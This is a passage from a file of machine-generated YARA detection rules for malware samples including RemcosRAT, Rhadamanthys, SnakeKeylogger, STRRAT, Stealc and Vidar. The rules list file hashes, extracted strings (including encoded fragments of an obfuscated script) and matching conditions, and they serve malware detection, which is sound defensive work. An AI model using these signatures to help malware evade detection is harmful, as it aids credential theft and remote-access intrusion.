      $s7 = "An action was attempted during deserialization that could lead to a security vulnerability. The action has been aborted. To allo" wide /* score: '11.00'*/
      $s8 = "DEnsureThreadPoolBindingInitialized*InitThreadPoolBinding" fullword ascii /* score: '10.00'*/
      $s9 = ":get_DeserializationInProgress@ThrowIfDeserializationInProgress" fullword ascii /* score: '9.00'*/
      $s10 = "get_OwnsHandle" fullword ascii /* score: '9.00'*/
      $s11 = "\"GetOverlappedData" fullword ascii /* score: '9.00'*/
      $s12 = "@GetNativeOverlappedForSyncHandle" fullword ascii /* score: '9.00'*/
      $s13 = "*GetBytesForSmallInput,GetStringForSmallInput\\<GetMaxByteCount>g__ThrowArgumentException|7_0\\<GetMaxCharCount>g__ThrowArgument" ascii /* score: '9.00'*/
      $s14 = "\"GetLeadByteRanges" fullword ascii /* score: '9.00'*/
      $s15 = "GetFileOptions@" fullword ascii /* score: '9.00'*/
   condition:
      ( uint16(0) == 0x5a4d and filesize < 23000KB and ( 8 of them )
      ) or ( all of them )
}

rule _RemcosRAT_signature__7d55bce71f04e2295549851ae8e8438c_imphash__Rhadamanthys_signature__198098fa616880c50e48e8c22b284156_imp_112 {
   meta:
      description = "_subset_batch - from files RemcosRAT(signature)_7d55bce71f04e2295549851ae8e8438c(imphash).exe, Rhadamanthys(signature)_198098fa616880c50e48e8c22b284156(imphash).exe, Rhadamanthys(signature)_7bfcbc53d4c02bdedbc3a63219e5ed9f(imphash).exe, SnakeKeylogger(signature)_995cce3d6fb20b2d8af502c8788f55d7(imphash).exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "4b052c0a60681008a7ebd4b9797badf24129a8710c0ec56fe560c14c61c44f79"
      hash2 = "faff87c6bdf6c63216c2507eee89ae434cce7da8a940373e0ace694798b976c7"
      hash3 = "a5e075e870c492583a67a818932e5c48d879db6d343ac6c837306222e444b8d7"
      hash4 = "faa45b0c9550932a04ceb9a608e53f3688215a757eab77c264d135a149466984"
   strings:
      $s1 = "DDetermineThreadPoolThreadTimeoutMs.get_HasForcedMinThreads.get_HasForcedMaxThreads4GetIOCompletionPollerCount,CreateIOCompletio" ascii /* score: '21.00'*/
      $s2 = "DDetermineThreadPoolThreadTimeoutMs.get_HasForcedMinThreads.get_HasForcedMaxThreads4GetIOCompletionPollerCount,CreateIOCompletio" ascii /* score: '18.00'*/
      $s3 = "System.Threading.ThreadPool.ProcessorsPerIOPollerThrea" fullword wide /* score: '18.00'*/
      $s4 = "Failed to create an IO completion port. HR:" fullword wide /* score: '13.00'*/
      $s5 = "System.Diagnostics.Eventing.FrameworkEventSourc" fullword wide /* score: '13.00'*/
      $s6 = "GetInt32Config" fullword ascii /* score: '12.00'*/
      $s7 = "&GetSystemDirectoryW" fullword ascii /* score: '12.00'*/
      $s8 = "&AwakeWaiterIfNeeded2GetWaiterForCurrentThread" fullword ascii /* score: '12.00'*/
      $s9 = "ExitSlowPath2get_IsHeldByCurrentThread" fullword ascii /* score: '12.00'*/
      $s10 = "$PortableThreadPool" fullword ascii /* score: '10.00'*/
      $s11 = "DOTNET_SYSTEM_NET_SOCKETS_INLINE_COMPLETION" fullword wide /* score: '10.00'*/
      $s12 = "System.Threading.Tasks.TplEventSourc" fullword wide /* score: '10.00'*/
      $s13 = "System.Threading.ThreadPool.MaxThread" fullword wide /* score: '10.00'*/
      $s14 = "System.Threading.ThreadPool.MinThread" fullword wide /* score: '10.00'*/
      $s15 = "System.Threading.ThreadPool.ThreadTimeoutM" fullword wide /* score: '10.00'*/
   condition:
      ( uint16(0) == 0x5a4d and filesize < 20000KB and ( 8 of them )
      ) or ( all of them )
}

rule _Rhadamanthys_signature__acb97f311176c6761732879ff5096c34_imphash__SnakeKeylogger_signature__636312a5ec1f8b9f790598a6e097c5a_113 {
   meta:
      description = "_subset_batch - from files Rhadamanthys(signature)_acb97f311176c6761732879ff5096c34(imphash).exe, SnakeKeylogger(signature)_636312a5ec1f8b9f790598a6e097c5a4(imphash).exe, SnakeKeylogger(signature)_636312a5ec1f8b9f790598a6e097c5a4(imphash)_082c1741.exe, SnakeKeylogger(signature)_d9d3dc366861974d56e9cfc24758d032(imphash).exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "cac7b5e6cdd5bf4fdcd9017dd1e23837cfb4b67a9568a70bb6a6525a0f313438"
      hash2 = "cbc7b8123f7ef72341952e2e1acb4b8debdb0e3df2ecfcce92eedf95e208e63d"
      hash3 = "082c17414af12072323ba9f4c1b1ce57491434032ff5f339374866dea3dfcc09"
      hash4 = "2f4b19d08da3f9a16b75ff1211c2aecd6e2b4f372f832b8fc6499cb1ea6384f3"
   strings:
      $s1 = "System.Core, Version=3.5.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089" fullword ascii /* score: '27.00'*/
      $s2 = ".get_ShouldLogInEventLog@" fullword ascii /* score: '20.00'*/
      $s3 = "QueueTask(TryExecuteTaskInline&GetAllocationLength" fullword ascii /* score: '19.00'*/
      $s4 = "$ExecuteEntryUnsafe@" fullword ascii /* score: '18.00'*/
      $s5 = "VExecuteEntryCancellationRequestedOrCanceled,ExecuteWithThreadLocal@" fullword ascii /* score: '17.00'*/
      $s6 = "$GetRuntimeTypeInfo" fullword ascii /* score: '12.00'*/
      $s7 = "Enter4EnterAndGetCurrentThreadId@" fullword ascii /* score: '12.00'*/
      $s8 = "z<GetRuntimeTypeInfo>g__GetConstructedGenericTypeForHandle|2_0t<GetRuntimeTypeInfo>g__GetFunctionPointerTypeForHandle|2_1" fullword ascii /* score: '12.00'*/
      $s9 = "ComparerHelpers.EqualityComparerHelpers" fullword ascii /* score: '10.00'*/
      $s10 = "timeout.yieldedBeforeCompletion" fullword ascii /* score: '10.00'*/
      $s11 = ":get_FormattedInvalidCultureIdPInternalGetAbbreviatedDayOfWeekNamesCoreHInternalGetAbbreviatedMonthNamesCore@" fullword ascii /* score: '9.00'*/
      $s12 = "get_IsGCPointer$get_UnderlyingType0get_HasStaticConstructor\"GetTypeDefinition" fullword ascii /* score: '9.00'*/
      $s13 = "<<GetTransitiveNamespaces>d__19" fullword ascii /* score: '9.00'*/
      $s14 = ".get_AbbreviatedDayNames2get_AbbreviatedMonthNames(get_DecimalSeparator" fullword ascii /* score: '9.00'*/
      $s15 = "B<CoreGetDeclaredNestedTypes>d__61" fullword ascii /* score: '9.00'*/
   condition:
      ( uint16(0) == 0x5a4d and filesize < 13000KB and ( 8 of them )
      ) or ( all of them )
}

rule _STRRAT_signature__STRRAT_signature__20c90a2d_114 {
   meta:
      description = "_subset_batch - from files STRRAT(signature).js, STRRAT(signature)_20c90a2d.js"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "26616e50b172813a20f873380129a57fe17d78c9b139dc511e42ffa78f3cbcd4"
      hash2 = "20c90a2dc95ae965457ca1b792f97dd8a755b75df6edad3d39dcf540be6306af"
   strings:
      $s1 = "g0NVx4NzJceDM0XHg2QVx4MzRceDUzXHg2Qlx4NEFceDU0XHgzMFx4NzZceDM0XHg3Mlx4NkZceDUyXHg2RVx4NEFceDQ4XHg3OFx4NTBceDc3XHg3Nlx4NjNceDZDXH" ascii /* score: '11.00'*/
      $s2 = "g0Mlx4NzZceDZDXHg3QVx4NEJceDU1XHg0NVx4NjZceDdBXHg2OVx4NDZceDUyXHg0Nlx4NkNceDQ1XHg1QVx4NjVceDRBXHg2RFx4NDNceDMxXHg2OVx4NkFceDZGXH" ascii /* score: '11.00'*/
      $s3 = "g1NFx4NTVceDRGXHg0OFx4NzRceDcxXHg0N1x4NTBceDREXHg1MVx4NzdceDM0XHg1Nlx4NzZceDZBXHg0NFx4NzNceDMzXHg3NFx4NDZceDY2XHg3QVx4NjlceDVBXH" ascii /* score: '11.00'*/
      $s4 = "g2RVx4NzlceDRGXHg0OFx4NERceDQyXHg2RFx4MkJceDM4XHg3OFx4NzlceDM1XHgzOVx4NzlceDc5XHgzNVx4NDZceDM0XHg3NVx4NEVceDc3XHg1M1x4NkNceDY4XH" ascii /* score: '11.00'*/
      $s5 = "g0Q1x4NzFceDUzXHg3NFx4MkZceDM3XHg2Rlx4MzdceDcxXHgzNlx4NDRceDc4XHg2OVx4N0FceDZBXHg0RVx4NkFceDc5XHgzOFx4NEFceDMxXHg3QVx4MzlceDcyXH" ascii /* score: '11.00'*/
      $s6 = "gyRlx4NDVceDcyXHg0M1x4NzJceDc5XHg1OFx4MzhceDUyXHg3M1x4NEJceDcyXHg0NVx4NkVceDM0XHg3Mlx4MzRceDU4XHg2M1x4NTNceDY2XHg2OVx4MkZceDY4XH" ascii /* score: '11.00'*/
      $s7 = "g3MVx4NzFceDZEXHg1QVx4NjdceDMyXHg2OVx4NzhceDREXHg1QVx4NTJceDRDXHgzNVx4NTRceDREXHg2OFx4NDZceDQ1XHgyRlx4NkNceDREXHg3OVx4NjdceDMyXH" ascii /* score: '11.00'*/
      $s8 = "g0Nlx4NjdceDc2XHgzM1x4NjhceDRGXHg2NVx4NTZceDUzXHg0OVx4NjRceDQ4XHg3Nlx4NjFceDMyXHg3OFx4NjNceDQzXHg3Mlx4NzlceDY4XHg3Nlx4NkFceDY5XH" ascii /* score: '11.00'*/
      $s9 = "g1OVx4NTdceDZFXHg3Mlx4NEZceDU1XHg1MFx4NDdceDMxXHg1Nlx4NjdceDQ4XHgzOFx4NDJceDU1XHg0NVx4NzNceDQ4XHg0M1x4NDRceDczXHg1QVx4NjVceDU2XH" ascii /* score: '11.00'*/
      $s10 = "g2Mlx4NzlceDM5XHg3NVx4NjJceDZEXHg1Mlx4NkRceDVBXHg0N1x4NUFceDZEXHg1QVx4NDNceDM1XHg2QVx4NjJceDQ3XHg0Nlx4N0FceDYzXHgzMVx4NDJceDRDXH" ascii /* score: '11.00'*/
      $s11 = "g2NVx4NjdceDUzXHg2Qlx4NzNceDc4XHgzOFx4NjNceDVBXHg0M1x4NkFceDRBXHg0Rlx4NDNceDc1XHg1Mlx4NDZceDJGXHg0Q1x4NzBceDczXHgzOVx4NEZceDZGXH" ascii /* score: '11.00'*/
      $s12 = "g1MVx4NkJceDYyXHg1Nlx4NDhceDY0XHgzMFx4NzZceDU5XHg1NFx4MzBceDc0XHgzMFx4NThceDM0XHg0NFx4MkZceDM4XHg0OFx4NzdceDQ0XHg1Nlx4NDJceDRDXH" ascii /* score: '11.00'*/
      $s13 = "g1M1x4NzhceDYzXHgzNVx4NTBceDU5XHgzMFx4MkJceDU4XHg3OFx4MzlceDVBXHgzMVx4NDVceDQ5XHgzM1x4NkVceDU2XHg2RFx4MzhceDRBXHg1N1x4MzJceDZFXH" ascii /* score: '11.00'*/
      $s14 = "g2MVx4NjhceDM4XHg2M1x4NjlceDMxXHg2NFx4NEVceDU3XHgzN1x4NTVceDMzXHg2OVx4MkJceDdBXHg2OFx4NjJceDdBXHg1QVx4NkJceDRFXHg3Mlx4NzlceDQyXH" ascii /* score: '11.00'*/
      $s15 = "g1Nlx4MzVceDZGXHgzOVx4NkJceDZEXHgzMlx4NkJceDRDXHgyQlx4NTRceDY3XHg3QVx4MzdceDc2XHg1QVx4NkFceDU1XHg0Nlx4NzRceDQ0XHgzOVx4NTJceDQ1XH" ascii /* score: '11.00'*/
   condition:
      ( uint16(0) == 0x7453 and filesize < 2000KB and ( 8 of them )
      ) or ( all of them )
}

rule _RemcosRAT_signature__f34d5f2d4577ed6d9ceec516c1f5a744_imphash__96a0774f_SnakeKeylogger_signature__f34d5f2d4577ed6d9ceec516c_115 {
   meta:
      description = "_subset_batch - from files RemcosRAT(signature)_f34d5f2d4577ed6d9ceec516c1f5a744(imphash)_96a0774f.exe, SnakeKeylogger(signature)_f34d5f2d4577ed6d9ceec516c1f5a744(imphash)_593b2dd3.exe, SnakeKeylogger(signature)_f34d5f2d4577ed6d9ceec516c1f5a744(imphash)_e69f506f.exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "96a0774fc25c036056be449766e6829678457f642381dbbd99525f4866e55f70"
      hash2 = "593b2dd3e7a1806f5f97341c297792834c28f57fb95e33c4528c733a9fed4c73"
      hash3 = "e69f506fb5549fac407a4e5e7c3400e73adfe40329a262771d7bae9a5ab1ba17"
   strings:
      $s1 = "SELECT * FROM tbl_users WHERE username= '" fullword wide /* score: '16.00'*/
      $s2 = "Back to LOGIN" fullword wide /* score: '15.00'*/
      $s3 = "Provider=Microsoft.Jet.OLEDB.4.0;Data Source=db_users.mdb" fullword wide /* score: '15.00'*/
      $s4 = "frmLogin" fullword wide /* score: '15.00'*/
      $s5 = "Login_And_Register_Form.Properties.Resources" fullword wide /* score: '15.00'*/
      $s6 = "Login_And_Register_Form" fullword wide /* score: '15.00'*/
      $s7 = "Username and Password fields are empty" fullword wide /* score: '12.00'*/
      $s8 = "INSERT INTO tbl_users VALUES ('" fullword wide /* score: '12.00'*/
      $s9 = "Passwords does not match, please re-enter the password" fullword wide /* score: '12.00'*/
      $s10 = "chckbxPassword" fullword wide /* score: '12.00'*/
      $s11 = "' and password= '" fullword wide /* score: '12.00'*/
      $s12 = "Invalid username or password, please try again" fullword wide /* score: '12.00'*/
      $s13 = "Already Have An Account" fullword wide /* score: '10.00'*/
      $s14 = "Get Started" fullword wide /* score: '9.00'*/
      $s15 = "btnequal" fullword wide /* score: '8.00'*/
   condition:
      ( uint16(0) == 0x5a4d and filesize < 3000KB and pe.imphash() == "f34d5f2d4577ed6d9ceec516c1f5a744" and ( 8 of them )
      ) or ( all of them )
}

rule _RemcosRAT_signature__7d55bce71f04e2295549851ae8e8438c_imphash__RemcosRAT_signature__f8676c0eabd52438a3e9d250ae4ce9d9_imphas_116 {
   meta:
      description = "_subset_batch - from files RemcosRAT(signature)_7d55bce71f04e2295549851ae8e8438c(imphash).exe, RemcosRAT(signature)_f8676c0eabd52438a3e9d250ae4ce9d9(imphash).exe, Rhadamanthys(signature)_acb97f311176c6761732879ff5096c34(imphash).exe, SnakeKeylogger(signature)_995cce3d6fb20b2d8af502c8788f55d7(imphash).exe, SnakeKeylogger(signature)_d9d3dc366861974d56e9cfc24758d032(imphash).exe, SnakeKeylogger(signature)_f8676c0eabd52438a3e9d250ae4ce9d9(imphash).exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "4b052c0a60681008a7ebd4b9797badf24129a8710c0ec56fe560c14c61c44f79"
      hash2 = "b1b35d08454aa76254214c2fb611bab5b7de66751c502203ee16690b9c754936"
      hash3 = "cac7b5e6cdd5bf4fdcd9017dd1e23837cfb4b67a9568a70bb6a6525a0f313438"
      hash4 = "faa45b0c9550932a04ceb9a608e53f3688215a757eab77c264d135a149466984"
      hash5 = "2f4b19d08da3f9a16b75ff1211c2aecd6e2b4f372f832b8fc6499cb1ea6384f3"
      hash6 = "25a0cac54fdaeec8e52d8c5689f775fb00c6af4e6c07935ad967fd4a6c09971b"
   strings:
      $s1 = "GetOSVersion&get_SystemDirectory4GetEnvironmentVariableCoreLGetEnvironmentVariableCore_NoArrayPool" fullword ascii /* score: '15.00'*/
      $s2 = "\"get_VersionString$IsOSVersionAtLeast" fullword ascii /* score: '12.00'*/
      $s3 = "RtlGetVersionEx" fullword ascii /* score: '12.00'*/
      $s4 = "@<RtlGetVersion>g____PInvoke|22_0" fullword ascii /* score: '12.00'*/
      $s5 = ".SystemTimeProviderTimer$SystemTimeProvider" fullword ascii /* score: '11.00'*/
      $s6 = "&FinishContinuations RunContinuations4RunOrQueueCompletionAction@" fullword ascii /* score: '10.00'*/
      $s7 = "get_TickCount64" fullword ascii /* score: '9.00'*/
      $s8 = "get_TimeOfDay@" fullword ascii /* score: '9.00'*/
      $s9 = "$RhGetGcTotalMemory\"RhStartNoGCRegion" fullword ascii /* score: '9.00'*/
      $s10 = "Versioning" fullword ascii /* score: '9.00'*/
      $s11 = "OSVersion's call to GetVersionEx failed" fullword wide /* score: '8.00'*/
      $s12 = "platfor" fullword wide /* score: '8.00'*/
   condition:
      ( uint16(0) == 0x5a4d and filesize < 23000KB and ( 8 of them )
      ) or ( all of them )
}

rule _RemcosRAT_signature__f34d5f2d4577ed6d9ceec516c1f5a744_imphash__fb51ffcf_SnakeKeylogger_signature__f34d5f2d4577ed6d9ceec516c_117 {
   meta:
      description = "_subset_batch - from files RemcosRAT(signature)_f34d5f2d4577ed6d9ceec516c1f5a744(imphash)_fb51ffcf.exe, SnakeKeylogger(signature)_f34d5f2d4577ed6d9ceec516c1f5a744(imphash)_10f246e9.exe, SnakeKeylogger(signature)_f34d5f2d4577ed6d9ceec516c1f5a744(imphash)_944c9457.exe, SnakeKeylogger(signature)_f34d5f2d4577ed6d9ceec516c1f5a744(imphash)_f67354f2.exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "fb51ffcffd134849ebc6114eacc45a0bd9f2430188fd33064217df5b4cd41508"
      hash2 = "10f246e9a23f84a9e80787e654d3f5612eaded3b992ccaa7a92a94ce8676e40f"
      hash3 = "944c94577ed913dad804faa6e0a51c10ec26780e63b8852c92c64f23919a4848"
      hash4 = "f67354f208b9b7ea9e45262b27221c5862c73503d92139051a88c0479fc04cda"
   strings:
      $s1 = "Error generating password: " fullword wide /* score: '19.00'*/
      $s2 = "Password length must be between 4 and 128 characters." fullword wide /* score: '12.00'*/
      $s3 = "No character types selected for password generation." fullword wide /* score: '12.00'*/
      $s4 = "Password copied to clipboard!" fullword wide /* score: '12.00'*/
      $s5 = "Password Options" fullword wide /* score: '12.00'*/
      $s6 = "Enter characters to use in password" fullword wide /* score: '12.00'*/
      $s7 = "A secure password generator for Windows." fullword wide /* score: '12.00'*/
      $s8 = "Features customizable length, character types, and advanced options for creating strong passwords." fullword wide /* score: '12.00'*/
      $s9 = "About Password Generator" fullword wide /* score: '12.00'*/
      $s10 = "PassGenerator.Forms.SettingsForm.resources" fullword ascii /* score: '10.00'*/
      $s11 = "PassGenerator.Properties.Resources.resources" fullword ascii /* score: '10.00'*/
      $s12 = "PassGenerator.Forms.AboutForm.resources" fullword ascii /* score: '10.00'*/
      $s13 = "PassGenerator.Forms.MainForm.resources" fullword ascii /* score: '10.00'*/
   condition:
      ( uint16(0) == 0x5a4d and filesize < 3000KB and pe.imphash() == "f34d5f2d4577ed6d9ceec516c1f5a744" and ( 8 of them )
      ) or ( all of them )
}

rule _RemcosRAT_signature__f8676c0eabd52438a3e9d250ae4ce9d9_imphash__Rhadamanthys_signature__acb97f311176c6761732879ff5096c34_imp_118 {
   meta:
      description = "_subset_batch - from files RemcosRAT(signature)_f8676c0eabd52438a3e9d250ae4ce9d9(imphash).exe, Rhadamanthys(signature)_acb97f311176c6761732879ff5096c34(imphash).exe, SnakeKeylogger(signature)_636312a5ec1f8b9f790598a6e097c5a4(imphash).exe, SnakeKeylogger(signature)_636312a5ec1f8b9f790598a6e097c5a4(imphash)_082c1741.exe, SnakeKeylogger(signature)_995cce3d6fb20b2d8af502c8788f55d7(imphash).exe, SnakeKeylogger(signature)_d9d3dc366861974d56e9cfc24758d032(imphash).exe, SnakeKeylogger(signature)_f8676c0eabd52438a3e9d250ae4ce9d9(imphash).exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "b1b35d08454aa76254214c2fb611bab5b7de66751c502203ee16690b9c754936"
      hash2 = "cac7b5e6cdd5bf4fdcd9017dd1e23837cfb4b67a9568a70bb6a6525a0f313438"
      hash3 = "cbc7b8123f7ef72341952e2e1acb4b8debdb0e3df2ecfcce92eedf95e208e63d"
      hash4 = "082c17414af12072323ba9f4c1b1ce57491434032ff5f339374866dea3dfcc09"
      hash5 = "faa45b0c9550932a04ceb9a608e53f3688215a757eab77c264d135a149466984"
      hash6 = "2f4b19d08da3f9a16b75ff1211c2aecd6e2b4f372f832b8fc6499cb1ea6384f3"
      hash7 = "25a0cac54fdaeec8e52d8c5689f775fb00c6af4e6c07935ad967fd4a6c09971b"
   strings:
      $s1 = "BTransitionToCancellationRequested.ExecuteCallbackHandlers" fullword ascii /* score: '21.00'*/
      $s2 = "Decoded string is not a valid IDN name" fullword wide /* score: '18.00'*/
      $s3 = "Invalid IDN encoded string" fullword wide /* score: '16.00'*/
      $s4 = "KeyEquals@" fullword ascii /* score: '12.00'*/
      $s5 = "Hashtable insert failed. Load factor too high. The most common cause is multiple threads writing to the Hashtable simultaneously" wide /* score: '12.00'*/
      $s6 = "PunycodeDecode" fullword ascii /* score: '11.00'*/
      $s7 = "Item has already been added. Key in dictionary: '{0}'  Key being added: '{1}" fullword wide /* score: '10.00'*/
      $s8 = "&GetUnicodeInvariant" fullword ascii /* score: '9.00'*/
      $s9 = "get_NlsFlags$ThrowForZeroLength" fullword ascii /* score: '9.00'*/
      $s10 = "GetUnicode\"GetAsciiInvariant(ValidateStd3AndAscii" fullword ascii /* score: '9.00'*/
      $s11 = "\"IcuGetUnicodeCore@" fullword ascii /* score: '9.00'*/
      $s12 = "IcuGetAsciiCore@" fullword ascii /* score: '9.00'*/
      $s13 = "NlsGetAsciiCore\"NlsGetUnicodeCore" fullword ascii /* score: '9.00'*/
   condition:
      ( uint16(0) == 0x5a4d and filesize < 23000KB and ( 8 of them )
      ) or ( all of them )
}

rule _Rhadamanthys_signature__7bfcbc53d4c02bdedbc3a63219e5ed9f_imphash__Rhadamanthys_signature__d5834be2544a02797750dc7759c325d4__119 {
   meta:
      description = "_subset_batch - from files Rhadamanthys(signature)_7bfcbc53d4c02bdedbc3a63219e5ed9f(imphash).exe, Rhadamanthys(signature)_d5834be2544a02797750dc7759c325d4(imphash).exe, SnakeKeylogger(signature)_636312a5ec1f8b9f790598a6e097c5a4(imphash).exe, SnakeKeylogger(signature)_636312a5ec1f8b9f790598a6e097c5a4(imphash)_082c1741.exe, SnakeKeylogger(signature)_d9d3dc366861974d56e9cfc24758d032(imphash).exe, SnakeKeylogger(signature)_e1286f2989f2b70b354fe5e33036a7bb(imphash).exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "a5e075e870c492583a67a818932e5c48d879db6d343ac6c837306222e444b8d7"
      hash2 = "a18e90d3f747ff22bdd705536ec38718b3611ae4ecd74fee73509faf5b708ec7"
      hash3 = "cbc7b8123f7ef72341952e2e1acb4b8debdb0e3df2ecfcce92eedf95e208e63d"
      hash4 = "082c17414af12072323ba9f4c1b1ce57491434032ff5f339374866dea3dfcc09"
      hash5 = "2f4b19d08da3f9a16b75ff1211c2aecd6e2b4f372f832b8fc6499cb1ea6384f3"
      hash6 = "e1eb24ee7b92716ab4ca09309e4dc4ce5470f832145d00f18a2eda2dcd595384"
   strings:
      $s1 = "*ComputePublicKeyToken" fullword ascii /* score: '16.00'*/
      $s2 = "2InitializeExecutionDomain" fullword ascii /* score: '16.00'*/
      $s3 = "6TryGetTypeTemplate_Internal" fullword ascii /* score: '16.00'*/
      $s4 = "\"ProcessFinalizers" fullword ascii /* score: '15.00'*/
      $s5 = "2GetStructUnsafeStructSize<GetForwardDelegateCreationStub" fullword ascii /* score: '14.00'*/
      $s6 = "(GetRuntimeTypeHandle" fullword ascii /* score: '12.00'*/
      $s7 = " GetBooleanConfig" fullword ascii /* score: '12.00'*/
      $s8 = "6GetSupportedConsoleEncoding" fullword ascii /* score: '12.00'*/
      $s9 = ":GetExceptionForLastWin32Error" fullword ascii /* score: '12.00'*/
      $s10 = "&GetRuntimeException" fullword ascii /* score: '12.00'*/
      $s11 = "2GetExceptionForWin32Error" fullword ascii /* score: '12.00'*/
      $s12 = "&GetAddressFromIndex@" fullword ascii /* score: '12.00'*/
      $s13 = "HTryGetMethodMetadataFromStartAddress" fullword ascii /* score: '12.00'*/
      $s14 = "0TypeSystemContextFactory.WellKnownTypeExtensions" fullword ascii /* score: '10.00'*/
      $s15 = "8GetUnsignedForBagElementKind@" fullword ascii /* score: '9.00'*/
   condition:
      ( uint16(0) == 0x5a4d and filesize < 12000KB and ( 8 of them )
      ) or ( all of them )
}

rule _Rhadamanthys_signature__198098fa616880c50e48e8c22b284156_imphash__Rhadamanthys_signature__7bfcbc53d4c02bdedbc3a63219e5ed9f__120 {
   meta:
      description = "_subset_batch - from files Rhadamanthys(signature)_198098fa616880c50e48e8c22b284156(imphash).exe, Rhadamanthys(signature)_7bfcbc53d4c02bdedbc3a63219e5ed9f(imphash).exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "faff87c6bdf6c63216c2507eee89ae434cce7da8a940373e0ace694798b976c7"
      hash2 = "a5e075e870c492583a67a818932e5c48d879db6d343ac6c837306222e444b8d7"
   strings:
      $s1 = "<get_IsValidLocationForInliningXSystem.Threading.IThreadPoolWorkItem.Execute" fullword ascii /* score: '23.00'*/
      $s2 = "get_ProcessPath\"GetFolderPathCore<ExpandEnvironmentVariablesCore" fullword ascii /* score: '20.00'*/
      $s3 = "GetProcessPath&get_SystemDirectory4GetEnvironmentVariableCoreLGetEnvironmentVariableCore_NoArrayPool" fullword ascii /* score: '20.00'*/
      $s4 = "2WriteProcessMemory_Native" fullword ascii /* score: '15.00'*/
      $s5 = "ReadProcessMemor" fullword wide /* score: '15.00'*/
      $s6 = "\"TransferLocalWorkVGetOrCreateThreadLocalCompletionCountObject&NotifyThreadBlocked*NotifyThreadUnblocked&RequestWorkerThread$ge" ascii /* score: '14.00'*/
      $s7 = "\"TransferLocalWorkVGetOrCreateThreadLocalCompletionCountObject&NotifyThreadBlocked*NotifyThreadUnblocked&RequestWorkerThread$ge" ascii /* score: '14.00'*/
      $s8 = "FGetUninlinedThreadStaticBaseForType" fullword ascii /* score: '12.00'*/
      $s9 = "<UnregisterCancellationCallback:get_InvokeMayRunArbitraryCode" fullword ascii /* score: '12.00'*/
      $s10 = "Serilog.Capturing.IsStructureValueSupported" fullword ascii /* score: '11.00'*/
      $s11 = "SpinLock ProcessorIdCache'" fullword ascii /* score: '11.00'*/
      $s12 = "VThrowNotSupportedException_UnwritableStream8ThrowObjectDisposedExceptionRThrowObjectDisposedException_StreamClosed2ThrowOutOfMe" ascii /* score: '10.00'*/
      $s13 = "kernel3" fullword wide /* score: '10.00'*/
      $s14 = ".CryptographicOperations" fullword ascii /* score: '9.00'*/
      $s15 = "GetNewTableSize@" fullword ascii /* score: '9.00'*/
   condition:
      ( uint16(0) == 0x5a4d and filesize < 14000KB and ( 8 of them )
      ) or ( all of them )
}

rule _Rhadamanthys_signature__4035d2883e01d64f3e7a9dccb1d63af5_imphash__Rhadamanthys_signature__91802a615b3a5c4bcc05bc5f66a5b219__121 {
   meta:
      description = "_subset_batch - from files Rhadamanthys(signature)_4035d2883e01d64f3e7a9dccb1d63af5(imphash).exe, Rhadamanthys(signature)_91802a615b3a5c4bcc05bc5f66a5b219(imphash).exe, Rhadamanthys(signature)_c7269d59926fa4252270f407e4dab043(imphash).exe, SparkRAT(signature)_9cbefe68f395e67356e2a5d8d1b285c0(imphash).exe, SparkRAT(signature)_9cbefe68f395e67356e2a5d8d1b285c0(imphash)_d75aad03.exe, Stealc(signature)_c7269d59926fa4252270f407e4dab043(imphash).exe, Stealc(signature)_c7269d59926fa4252270f407e4dab043(imphash)_837a5ae1.exe, Vidar(signature)_4035d2883e01d64f3e7a9dccb1d63af5(imphash).exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "ae90bed12d49863359497bf1854c46626c5c524f1bd6883a2711505c849b99e7"
      hash2 = "7dcf3101452546647c0a3b55519db6ba479c7169067e35d8db41b8ff45028247"
      hash3 = "87eaae419cc95139893a6279261a43a2228aef451104a86ad06b42d670da1a63"
      hash4 = "ed370fcbafa43b4b578d5722e922e706dd854189e5a5b9ca17213c307b3f9a23"
      hash5 = "d75aad0391ff8c63fba6f7315e520f5ea61229591277b09240e48e185e435eea"
      hash6 = "31294603a887756a97d1f8b3b5f8a0f3ece03907448ea717dfc8b4d017be5897"
      hash7 = "837a5ae11a55ee51f20f6e1377a714730fe4df1914d22529064a70008393dca8"
      hash8 = "0eec336ef3b35dfae142ceb42443e8de490356b4bc81e358f10151832b1c75cc"
   strings:
      $s1 = "runtime.int64Hash" fullword ascii /* score: '13.00'*/
      $s2 = "runtime.runOpenDeferFrame" fullword ascii /* score: '13.00'*/
      $s3 = "runtime.addOneOpenDeferFrame.func1" fullword ascii /* score: '13.00'*/
      $s4 = "runtime.addOneOpenDeferFrame" fullword ascii /* score: '13.00'*/
      $s5 = "runtime.addOneOpenDeferFrame.func1.1" fullword ascii /* score: '13.00'*/
      $s6 = "framepc" fullword ascii /* score: '11.00'*/
      $s7 = "runtime.inPersistentAlloc" fullword ascii /* score: '10.00'*/
      $s8 = "runtime.(*maptype).reflexivekey" fullword ascii /* score: '10.00'*/
      $s9 = "runtime.(*maptype).hashMightPanic" fullword ascii /* score: '10.00'*/
      $s10 = "runtime.panicSlice3AlenU" fullword ascii /* score: '10.00'*/
      $s11 = "runtime.goPanicSlice3AlenU" fullword ascii /* score: '10.00'*/
      $s12 = "runtime.cfuncnameFromNameoff" fullword ascii /* score: '10.00'*/
      $s13 = "runtime.fastrandinit" fullword ascii /* score: '10.00'*/
      $s14 = "runtime.(*maptype).indirectkey" fullword ascii /* score: '10.00'*/
      $s15 = "runtime.(*maptype).needkeyupdate" fullword ascii /* score: '10.00'*/
   condition:
      ( uint16(0) == 0x5a4d and filesize < 30000KB and ( 8 of them )
      ) or ( all of them )
}

rule _RemcosRAT_signature__7d55bce71f04e2295549851ae8e8438c_imphash__RemcosRAT_signature__f8676c0eabd52438a3e9d250ae4ce9d9_imphas_122 {
   meta:
